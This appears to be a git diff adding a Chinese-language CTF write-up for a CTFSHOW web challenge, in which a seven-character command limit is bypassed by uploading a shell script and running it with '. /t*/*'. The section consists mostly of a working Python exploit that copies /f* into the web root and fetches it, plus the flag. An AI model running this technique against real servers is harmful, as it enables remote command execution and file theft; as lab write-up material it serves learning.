@@ -796,3 +796,40 @@ curl -d "what=flag" 靶机地址
 ### [2048](https://ce.pwnthebox.com/challenges?type=5&id=206)
 
 打开靶机后查看源码发现`main2048.js`，查看详情发现有个`gamewin()`函数，在`Console`输入`gamewin()`后弹出提示框，提示框显示的`flag{2O48_1s_fun}`是假`flag`，真正的`flag`在`Console`的输出里，提交`HEBTUCTF{Aaenc0de_1s_FuN}`即可。
+
+------
+
+## CTFSHOW
+
+### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
+
+靶机支持短命令执行但不会回显，审计代码发现关键函数`isSafe()`。
+
+```javascript
+function isSafe(cmd)
+{
+	return cmd.length<=7;
+}
+```
+
+`ctfshow{26c5c506-d5b9-4fa8-8916-dff74381d313}`
+
+```python
+import requests
+
+url = 'http://4a250af8-d2dd-4f75-ac03-9f2edbce2fb6.challenge.ctf.show/'
+
+file = {"file": "#!/bin/sh\ncat /f* > /var/www/html/flag.txt"}
+data = {"cmd": ". /t*/*"}
+response = requests.post(url+"api/tools.php", files=file, data=data)
+if "t*" in response.text:
+    print("The command has been executed.")
+response = requests.get(url=url+'flag.txt')
+if response.status_code == 200:
+    print('flag: '+response.text)
+else:
+    print('error')
+```
+
+------
+
